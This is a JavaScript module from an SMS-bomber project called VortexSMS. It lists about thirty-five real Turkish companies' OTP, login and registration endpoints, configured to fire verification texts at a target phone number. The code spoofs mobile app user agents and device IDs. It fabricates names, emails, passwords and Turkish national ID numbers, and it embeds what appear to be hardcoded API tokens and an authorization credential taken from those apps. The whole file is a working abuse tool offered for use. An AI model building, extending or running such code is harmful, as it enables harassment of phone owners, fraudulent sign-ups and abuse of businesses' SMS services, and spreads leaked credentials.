/**
 * VortexSMS - Other Services
 * 
 * Copyright (c) 2025-present XeldarAlz
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as published
 * by the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * Original Repository: https://github.com/XeldarAlz/Vortex-SMS-Spammer
 * 
 * NOTICE: Removing this notice or claiming this work as your own
 * is a violation of the license and may result in legal action.
 */

const { faker, generateTCKimlik, randomPassword, randomFullName, randomFirstName, randomLastName, randomBirthDate, randomDeviceId, randomDeviceInfo } = require('../helpers');
const ServiceBuilder = require('../service-builder');

const otherServices = [
    // ZarinPlus
    ServiceBuilder.jsonApi('ZarinPlus',
        'https://api.zarinplus.com/user/zarinpal-login',
        (phone) => ({ phone_number: '90' + phone })
    ),

    // Rentiva
    new ServiceBuilder('Rentiva')
        .url('https://rentiva.com:443/api/Account/Login')
        .headers({
            Accept: 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            Origin: 'ionic://localhost',
            'Accept-Encoding': 'gzip, deflate',
            'User-Agent': (() => randomDeviceInfo().userAgent)(),
            'Accept-Language': 'tr-TR,tr;q=0.9'
        })
        .json((phone) => ({
            appleId: null,
            code: '',
            email: '',
            facebookId: null,
            googleId: null,
            lastName: '',
            name: '',
            phone: phone,
            type: 1
        }))
        .successCodes([200, 201, 202, 204, 205])
        .build(),

    // Kimgb
    ServiceBuilder.jsonApi('Kimgb',
        'https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp',
        (phone) => ({ msisdn: `90${phone}` }),
        { timeout: 6000, successCodes: [200, 201, 202, 204, 205] }
    ),

    // Frink
    new ServiceBuilder('Frink')
        .url('https://api.frink.com.tr:443/api/auth/postSendOTP')
        .headers({
            Accept: '*/*',
            'Content-Type': 'application/json',
            Authorization: '',
            'Accept-Encoding': 'gzip, deflate, br',
            'User-Agent': (() => {
                const deviceInfo = randomDeviceInfo();
                return `Frink/1.4.6 (com.frink.userapp; build:1; iOS ${deviceInfo.version}) Alamofire/4.9.1`;
            })(),
            'Accept-Language': 'tr-TR;q=1.0, en-TR;q=0.9',
            Connection: 'close'
        })
        .json((phone) => ({
            areaCode: '90',
            etkContract: true,
            language: 'TR',
            phoneNumber: '90' + phone
        }))
        .timeout(6000)
        .build(),

    // Yapp
    new ServiceBuilder('Yapp')
        .url('https://yapp.com.tr:443/api/mobile/v1/register')
        .headers({
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'X-Content-Language': 'en',
            'Accept-Language': 'en-BA;q=1, tr-BA;q=0.9, bs-BA;q=0.8',
            Authorization: 'Bearer ',
            'User-Agent': (() => {
                const deviceInfo = randomDeviceInfo();
                return `YappApp/1.1.5 (iPhone; iOS ${deviceInfo.version}; Scale/3.00)`;
            })(),
            'Accept-Encoding': 'gzip, deflate, br'
        })
        .json((phone) => {
            const firstName = randomFirstName();
            const lastName = randomLastName();
            const deviceInfo = randomDeviceInfo();
            return {
                app_version: '1.1.5',
                code: 'tr',
                device_model: deviceInfo.device_model,
                device_name: firstName,
                device_type: 'I',
                device_version: deviceInfo.version,
                email: faker.internet.email(),
                firstname: firstName,
                is_allow_to_communication: '1',
                language_id: '2',
                lastname: lastName,
                phone_number: phone,
                sms_code: ''
            };
        })
        .timeout(6000)
        .build(),

    // Akbati
    new ServiceBuilder('Akbati')
        .url('https://akbatiapi.poilabs.com:443/v1/en/sms')
        .headers({
            Accept: '*/*',
            'Content-Type': 'application/json',
            'X-Platform-Token': 'a2fe21af-b575-4cd7-ad9d-081177c239a3',
            'User-Agent': 'Akdbat',
            'Accept-Language': 'en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8'
        })
        .json((phone) => ({ phone: phone }))
        .timeout(6000)
        .build(),

    // Akasya
    new ServiceBuilder('Akasya')
        .url('https://akasyaapi.poilabs.com:443/v1/en/sms')
        .headers({
            Accept: '*/*',
            'Content-Type': 'application/json',
            'X-Platform-Token': '9f493307-d252-4053-8c96-62e7c90271f5',
            'User-Agent': (() => {
                const deviceInfo = randomDeviceInfo();
                return `Akasya/2.0.13 (com.poilabs.akasyaavm; build:2; iOS ${deviceInfo.version}) Alamofire/4.9.1`;
            })(),
            'Accept-Language': 'en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8'
        })
        .json((phone) => ({ phone: phone }))
        .timeout(6000)
        .build(),

    // Suiste
    new ServiceBuilder('Suiste')
        .url('https://suiste.com:443/api/auth/code')
        .headers({
            'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
            'X-Mobillium-Device-Brand': 'Apple',
            Accept: 'application/json',
            'X-Mobillium-Os-Type': 'iOS',
            'X-Mobillium-Device-Model': 'iPhone',
            'Mobillium-Device-Id': '2390ED28-075E-465A-96DA-DFE8F84EB330',
            'Accept-Language': 'en',
            'X-Mobillium-Device-Id': '2390ED28-075E-465A-96DA-DFE8F84EB330',
            'Accept-Encoding': 'gzip, deflate, br',
            'X-Mobillium-App-Build-Number': '1469',
            'User-Agent': 'suiste/1.7.11 (com.mobillium.suiste; build:1469; iOS 15.8.3) Alamofire/5.9.1',
            'X-Mobillium-Os-Version': '15.8.3',
            'X-Mobillium-App-Version': '1.7.11'
        })
        .form((phone) => ({
            action: 'register',
            device_id: '2390ED28-075E-465A-96DA-DFE8F84EB330',
            full_name: randomFullName(),
            gsm: phone,
            is_advertisement: '1',
            is_contract: '1',
            password: randomPassword()
        }))
        .timeout(6000)
        .build(),

    // 345Dijital
    new ServiceBuilder('345Dijital')
        .url('https://api.345dijital.com:443/api/users/register')
        .headers({
            Accept: 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate',
            'User-Agent': 'AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'Accept-Language': 'en-US,en;q=0.9',
            Authorization: 'null',
            Connection: 'close'
        })
        .json((phone) => ({
            email: '',
            name: randomFirstName(),
            phoneNumber: '+90' + phone,
            surname: randomLastName()
        }))
        .successCodes([200, 201, 400])
        .build(),

    // Ayyildiz
    new ServiceBuilder('Ayyildiz')
        .url((phone) => `https://api.altinyildizclassics.com:443/mobileapi2/autapi/CreateSmsOtpForRegister?gsm=${phone}`)
        .headers({
            Accept: '*/*',
            Token: 'MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS',
            Devicetype: 'mobileapp',
            'Accept-Encoding': 'gzip, deflate',
            'User-Agent': (() => {
                const deviceInfo = randomDeviceInfo();
                return `altinyildiz/2.7 (com.brmagazacilik.altinyildiz; build:2; iOS ${deviceInfo.version}) Alamofire/2.7`;
            })(),
            'Accept-Language': 'en-TR;q=1.0, tr-TR;q=0.9'
        })
        .build(),

    // Istegelsin
    new ServiceBuilder('Istegelsin')
        .url('https://prod.fasapi.net:443/')
        .headers({
            Accept: '*/*',
            'Content-Type': 'application/x-www-form-urlencoded',
            'App-Version': '2528',
            'Accept-Encoding': 'gzip, deflate',
            Platform: 'IOS',
            'User-Agent': 'ig-sonkullanici-ios/161 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'Accept-Language': 'en-US,en;q=0.9'
        })
        .json((phone) => ({
            operationName: 'SendOtp2',
            query: 'mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}',
            variables: { phoneNumber: '90' + phone }
        }))
        .build(),

    // Pisir
    new ServiceBuilder('Pisir')
        .url('https://api.pisir.com:443/v1/login/')
        .headers({
            Accept: '*/*',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Pisir/386 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate'
        })
        .json((phone) => ({
            app_build: '386',
            app_platform: 'ios',
            msisdn: '+90' + phone
        }))
        .build(),

    // Beefull
    ServiceBuilder.jsonApi('Beefull',
        'https://app.beefull.io:443/api/inavitas-access-management/sms-login',
        (phone) => ({
            phoneCode: '90',
            phoneNumber: phone,
            tenant: 'beefull'
        })
    ),

    // Money
    new ServiceBuilder('Money')
        .url('https://www.money.com.tr:443/Account/ValidateAndSendOTP')
        .headers({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0',
            Accept: '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            Referer: 'https://www.money.com.tr/money-kartiniz-var-mi',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            Origin: 'https://www.money.com.tr',
            Dnt: '1',
            'Sec-Gpc': '1',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            Priority: 'u=0',
            Te: 'trailers'
        })
        .form((phone) => ({
            phone: phone.substring(0, 3) + ' ' + phone.substring(3, 10),
            GRecaptchaResponse: ''
        }))
        .timeout(6000)
        .build(),

    // Ido
    new ServiceBuilder('Ido')
        .url('https://api.ido.com.tr:443/idows/v2/register')
        .headers({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0',
            Accept: 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'tr',
            'Content-Type': 'application/json',
            Origin: 'https://www.ido.com.tr',
            Referer: 'https://www.ido.com.tr/',
            Dnt: '1',
            'Sec-Gpc': '1',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            Priority: 'u=0',
            Te: 'trailers'
        })
        .json((phone) => {
            const tc = generateTCKimlik();
            const dob = randomBirthDate('obj');
            const password = randomPassword();
            return {
                birthDate: true,
                captcha: '',
                checkPwd: password,
                code: '',
                day: dob.day,
                email: faker.internet.email(),
                emailNewsletter: false,
                firstName: randomFirstName().toUpperCase(),
                gender: Math.random() > 0.5 ? 'MALE' : 'FEMALE',
                lastName: randomLastName().toUpperCase(),
                mobileNumber: '0' + phone,
                month: dob.month,
                pwd: password,
                smsNewsletter: true,
                tckn: tc,
                termsOfUse: true,
                year: dob.year
            };
        })
        .timeout(6000)
        .build(),

    // YilmazTicaret
    new ServiceBuilder('YilmazTicaret')
        .url('https://app.buyursungelsin.com:443/api/customer/form/checkx')
        .headers({
            Accept: '*/*',
            'Content-Type': 'multipart/form-data; boundary=q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl',
            'Accept-Encoding': 'gzip, deflate, br',
            Authorization: 'Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm',
            'User-Agent': 'Ylmaz/38 CFNetwork/1335.0.3.4 Darwin/21.6.0',
            'Accept-Language': 'en-GB,en;q=0.9'
        })
        .data((phone) => {
            const phoneFormatted = `0 (${phone.substring(0, 3)}) ${phone.substring(3, 6)} ${phone.substring(6, 8)} ${phone.substring(8)}`;
            return `--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name="fonksiyon"\r\n\r\ncustomer/form/checkx\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name="method"\r\n\r\nPOST\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name="telephone"\r\n\r\n${phoneFormatted}\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name="token"\r\n\r\nd7841d399a16d0060d3b8a76bf70542e\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl--\r\n`;
        })
        .timeout(6000)
        .build(),

    // Kalmasin
    new ServiceBuilder('Kalmasin')
        .url('https://api.kalmasin.com.tr:443/user/login')
        .headers({
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br',
            'User-Agent': 'Kalmasin/2.0.6 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'Accept-Language': 'tr-TR,tr;q=0.9'
        })
        .json((phone) => ({
            dil: 'tr',
            device_id: randomDeviceId(),
            notification_mobile: 'android-notificationid-will-be-added',
            platform: 'android',
            version: '2.0.6',
            login_type: 1,
            telefon: phone
        }))
        .timeout(6000)
        .build(),

    // Yotto
    new ServiceBuilder('Yotto')
        .url('https://42577.smartomato.ru:443/account/session.json')
        .headers({
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br',
            'User-Agent': 'Yotto/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'Accept-Language': 'en-US,en;q=0.9'
        })
        .json((phone) => ({
            phone: `+90 (${phone.substring(0, 3)}) ${phone.substring(3, 6)}-${phone.substring(6)}`
        }))
        .successCodes([200, 201, 202, 204, 205])
        .timeout(6000)
        .build(),

    // Pawapp
    new ServiceBuilder('Pawapp')
        .url('https://api.pawder.app:443/api/authentication/sign-up')
        .headers({
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br',
            'User-Agent': 'Pawapp/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'Accept-Language': 'tr-TR,tr;q=0.9'
        })
        .json((phone) => ({
            languageId: '2',
            mobileInformation: '',
            data: {
                firstName: randomFirstName().toLowerCase(),
                lastName: randomLastName().toLowerCase(),
                userAgreement: 'true',
                kvkk: 'true',
                email: faker.internet.email(),
                phoneNo: phone,
                username: randomDeviceId().substring(0, 10)
            }
        }))
        .timeout(6000)
        .build(),

    // Mopas
    new ServiceBuilder('Mopas')
        .url('https://api.mopas.com.tr:443/authorizationserver/oauth/token?client_id=mobile_mopas&client_secret=secret_mopas&grant_type=client_credentials')
        .method('POST')
        .headers({
            Accept: 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip, deflate',
            'User-Agent': 'Mopas/1 CFNetwork/1335.0.3.2 Darwin/21.6.0'
        })
        .timeout(2000)
        .build(),

    // Mopas SMS Send (requires token from above)
    new ServiceBuilder('MopasSMS')
        .url((phone) => `https://api.mopas.com.tr:443/mopaswebservices/v2/mopas/sms/sendSmsVerification?mobilenumber=${phone}`)
        .method('GET')
        .headers({
            Accept: 'application/json',
            'Accept-Encoding': 'gzip, deflate',
            'User-Agent': 'Mopas/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            authorization: (() => {
                // Note: This requires getting token first, simplified for now
                return 'Bearer token_placeholder';
            })()
        })
        .timeout(6000)
        .build(),

    // Ninewest
    new ServiceBuilder('Ninewest')
        .url('https://www.ninewest.com.tr:443/webservice/v1/register.json')
        .headers({
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br',
            'User-Agent': 'Ninewest/3 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'Accept-Language': 'tr-TR,tr;q=0.9'
        })
        .json((phone) => ({
            alertMeWithEMail: false,
            alertMeWithSms: false,
            dataPermission: true,
            email: faker.internet.email(),
            genderId: Math.floor(Math.random() * 4),
            hash: '5488b0f6de',
            inviteCode: '',
            password: randomPassword(),
            phonenumber: `(${phone.substring(0, 3)}) ${phone.substring(3, 6)} ${phone.substring(6, 8)} ${phone.substring(8)}`,
            registerContract: true,
            registerMethod: 'mail',
            version: '3'
        }))
        .timeout(6000)
        .build(),

    // Saka
    new ServiceBuilder('Saka')
        .url('https://mobilcrm2.saka.com.tr:443/api/customer/login')
        .headers({
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br',
            'User-Agent': 'Saka/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'Accept-Language': 'tr-TR,tr;q=0.9'
        })
        .json((phone) => ({
            gsm: '0' + phone
        }))
        .timeout(6000)
        .build(),

    // Superpedestrian
    new ServiceBuilder('Superpedestrian')
        .url('https://consumer-auth.linkyour.city:443/consumer_auth/register')
        .headers({
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br',
            'User-Agent': 'Superpedestrian/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'Accept-Language': 'en-US,en;q=0.9'
        })
        .json((phone) => ({
            phone_number: `+90 ${phone.substring(0, 3)} ${phone.substring(3, 6)} ${phone.substring(6)}`
        }))
        .timeout(6000)
        .build(),

    // Gofody
    new ServiceBuilder('Gofody')
        .url('https://backend.gofody.com:443/api/v1/enduser/register/')
        .headers({
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br',
            'User-Agent': 'Gofody/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'Accept-Language': 'tr-TR,tr;q=0.9'
        })
        .json((phone) => ({
            country_code: '90',
            phone: phone
        }))
        .timeout(6000)
        .build(),

    // Weescooter
    new ServiceBuilder('Weescooter')
        .url('https://friendly-cerf.185-241-138-85.plesk.page:443/api/v1/members/gsmlogin')
        .headers({
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br',
            'User-Agent': 'WeeScooter/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'Accept-Language': 'tr-TR,tr;q=0.9'
        })
        .json((phone) => ({
            tenant: '62a1e7efe74a84ea61f0d588',
            gsm: phone
        }))
        .timeout(6000)
        .build(),

    // Signall
    new ServiceBuilder('Signall')
        .url('https://appservices.huzk.com:443/client/register')
        .headers({
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br',
            'User-Agent': 'Signall/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'Accept-Language': 'tr-TR,tr;q=0.9'
        })
        .json((phone) => ({
            name: '',
            phone: {
                number: phone,
                code: '90',
                country_code: 'TR',
                name: ''
            },
            countryCallingCode: '+90',
            countryCode: 'TR',
            approved: true,
            notifyType: 99,
            favorites: [],
            appKey: 'live-exchange'
        }))
        .timeout(6000)
        .build(),

    // Karma
    new ServiceBuilder('Karma')
        .url('https://api.gokarma.app:443/v1/auth/send-sms')
        .headers({
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br',
            'User-Agent': 'Karma/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'Accept-Language': 'tr-TR,tr;q=0.9'
        })
        .json((phone) => ({
            phonenumber: '90' + phone,
            type: 'REGISTER',
            deviceId: randomDeviceId(),
            language: 'tr-TR'
        }))
        .successCodes([200, 201, 202, 204, 205])
        .timeout(6000)
        .build(),

    // Hoplagit
    new ServiceBuilder('Hoplagit')
        .url('https://api.hoplagit.com:443/v1/auth:reqSMS')
        .headers({
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br',
            'User-Agent': 'Hoplagit/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'Accept-Language': 'tr-TR,tr;q=0.9'
        })
        .json((phone) => ({
            phone: '+90' + phone
        }))
        .successCodes([200, 201, 202, 204, 205])
        .timeout(6000)
        .build(),

    // Anadolu
    new ServiceBuilder('Anadolu')
        .url('https://www.anadolu.com.tr:443/Iletisim_Formu_sms.php')
        .headers({
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0',
            'Accept-Language': 'tr-TR,tr;q=0.9'
        })
        .form((phone) => ({
            Numara: phone.substring(0, 3) + phone.substring(3, 6) + phone.substring(6, 8) + phone.substring(8)
        }))
        .timeout(6000)
        .build(),

    // EnglishHome (Alternative registration endpoint)
    new ServiceBuilder('EnglishHomeReg')
        .url('https://www.englishhome.com:443/enh_app/users/registration/')
        .headers(ServiceBuilder.webHeaders('https://www.englishhome.com'))
        .json((phone) => ({
            first_name: randomFirstName().toLowerCase(),
            last_name: randomLastName().toLowerCase(),
            email: faker.internet.email(),
            phone: '0' + phone,
            password: randomPassword(),
            email_allowed: false,
            sms_allowed: false,
            confirm: true,
            tom_pay_allowed: true
        }))
        .successCodes([200, 201, 202, 204, 205])
        .timeout(6000)
        .build(),

    // Clickme
    new ServiceBuilder('Clickme')
        .url('https://mobile-gateway.clickmelive.com:443/api/v2/authorization/code')
        .headers({
            'Content-Type': 'application/json',
            Authorization: 'apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc',
            'Client-Version': '1.4.0',
            'Client-Device': 'IOS',
            'Accept-Language': 'tr-TR,tr;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'User-Agent': 'ClickMeLive/20 CFNetwork/1335.0.3.4 Darwin/21.6.0'
        })
        .json((phone) => ({
            phone: phone
        }))
        .timeout(6000)
        .build(),

    // Yuffi
    new ServiceBuilder('Yuffi')
        .url('https://api.yuffi.co:443/api/parent/login/user')
        .headers({
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br',
            'User-Agent': 'Yuffi/1 CFNetwork/1335.0.3.2 Darwin/21.6.0',
            'Accept-Language': 'tr-TR,tr;q=0.9'
        })
        .json((phone) => ({
            phone: phone,
            kvkk: true
        }))
        .timeout(6000)
        .build()
];

module.exports = otherServices;
